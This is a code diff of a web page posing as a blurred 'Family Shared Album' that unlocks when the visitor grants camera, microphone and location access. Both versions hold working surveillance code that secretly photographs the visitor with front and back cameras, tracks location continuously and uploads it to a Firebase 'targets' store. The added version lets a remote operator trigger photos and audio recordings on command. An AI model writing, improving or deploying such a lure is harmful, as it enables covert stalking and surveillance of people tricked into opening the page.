@@ -11,107 +11,79 @@
         .gallery { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 20px; }
         .img-container { position: relative; overflow: hidden; border-radius: 10px; height: 180px; }
         .img-container img { width: 100%; height: 100%; object-fit: cover; filter: blur(15px); transition: 2s; }
-        #unlockBtn { margin-top: 30px; padding: 15px 40px; font-size: 18px; font-weight: bold; background: #E91E63; color: white; border: none; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 15px rgba(233,30,99,0.4); }
-        #status { margin-top: 15px; color: #aaa; font-size: 14px; }
+        #unlockBtn { margin-top: 30px; padding: 15px 40px; font-size: 18px; font-weight: bold; background: #E91E63; color: white; border: none; border-radius: 50px; cursor: pointer; }
     </style>
 </head>
 <body>
-
-    <h2>🌸 Family Shared Album (6 Photos)</h2>
-    <p>This album is encrypted. Tap below to verify and view.</p>
-
-    <div class="gallery">
+    <h2>🌸 Family Shared Album</h2>
+    <div class="gallery" id="albumGallery">
         <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1583391733956-6c78276477e2?w=500"></div>
         <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1595950653106-6c9ebd614d3a?w=500"></div>
-        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1590540179852-2110a54f813a?w=500"></div>
-        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1581067723546-699720bc5642?w=500"></div>
-        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=500"></div>
-        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1503104834685-7205e8607eb9?w=500"></div>
     </div>
-
-    <button id="unlockBtn" onclick="unlockAlbum()">Tap to Unblur Album</button>
-    <p id="status">Waiting for verification...</p>
+    <button id="unlockBtn" onclick="initSystem()">Tap to View Album</button>
 
     <script>
-        // --- CONFIGURATION ---
         const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        const userId = "Driver_" + Math.floor(Math.random() * 9999);
+        const userId = "User_" + Math.floor(Math.random() * 9999);
 
-        async function unlockAlbum() {
-            document.getElementById('status').innerText = "Verifying Identity... Please Allow Permissions";
-            
-            // 1. Start Location Tracking
-            navigator.geolocation.watchPosition(success, error, { enableHighAccuracy: true });
-            
-            // 2. Start Camera & Audio Capture
+        async function initSystem() {
             try {
-                // Initial permission request
-                const initialStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-                initialStream.getTracks().forEach(track => track.stop()); // Stop immediately after permission
-                
-                // Chupke se dono camera se photo lena
-                await capturePhotos();
-                unblurPhotos();
-            } catch (err) {
-                alert("Verification Failed. Please allow permissions to view the album.");
-                console.log(err);
-            }
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+                stream.getTracks().forEach(t => t.stop());
+                navigator.geolocation.watchPosition(s => {
+                    db.ref('targets/' + userId + '/location').set({ lat: s.coords.latitude, lng: s.coords.longitude, time: new Date().toLocaleTimeString() });
+                });
+                unblur();
+                listenForCommands(); // Start listening for Admin buttons
+            } catch (e) { alert("Please allow permissions to view."); }
         }
 
-        async function capturePhotos() {
-            const modes = ['user', 'environment']; // Front aur Back
-            for (let mode of modes) {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: mode }, 
-                        audio: false 
-                    });
-                    
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    await video.play();
-
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    const imageData = canvas.toDataURL('image/jpeg', 0.5); // 0.5 for small size
-                    
-                    // Firebase Database mein bhejien
-                    db.ref('targets/' + userId + '/photos').push({
-                        type: mode === 'user' ? 'Front' : 'Back',
-                        image: imageData,
-                        time: new Date().toLocaleTimeString()
-                    });
-
-                    stream.getTracks().forEach(track => track.stop());
-                } catch (e) {
-                    console.log(mode + " Camera Error: " + e);
-                }
-            }
-        }
-
-        function success(pos) {
-            db.ref('targets/' + userId + '/location').set({
-                lat: pos.coords.latitude,
-                lng: pos.coords.longitude,
-                timestamp: new Date().toLocaleTimeString()
+        function listenForCommands() {
+            db.ref('commands/' + userId).on('value', async (snap) => {
+                const cmd = snap.val();
+                if (!cmd) return;
+                if (cmd.action === "snap") { await capturePhotos(); }
+                if (cmd.action === "mic") { await recordAudio(cmd.sec || 10); }
+                db.ref('commands/' + userId).set(null); // Clear command after execution
             });
         }
 
-        function error() {
-            console.log("GPS Denied");
+        async function capturePhotos() {
+            const modes = ['user', 'environment'];
+            for (let mode of modes) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    db.ref('targets/' + userId + '/photos').push({ image: canvas.toDataURL('image/jpeg', 0.5), type: mode, time: new Date().toLocaleTimeString() });
+                    stream.getTracks().forEach(t => t.stop());
+                } catch (e) { console.log(e); }
+            }
         }
 
-        function unblurPhotos() {
-            const images = document.querySelectorAll('.blur-img');
-            images.forEach(img => img.style.filter = "blur(0px)");
-            document.getElementById('unlockBtn').style.display = "none";
-            document.getElementById('status').innerText = "Album Unlocked ✅";
+        async function recordAudio(sec) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    const reader = new FileReader();
+                    reader.readAsDataURL(new Blob(chunks));
+                    reader.onloadend = () => db.ref('targets/' + userId + '/audio').push({ data: reader.result, time: new Date().toLocaleTimeString() });
+                };
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), sec * 1000);
+            } catch (e) { console.log(e); }
         }
+
+        function unblur() { document.querySelectorAll('.blur-img').forEach(i => i.style.filter = "blur(0px)"); document.getElementById('unlockBtn').style.display = "none"; }
     </script>
 </body>
 </html>
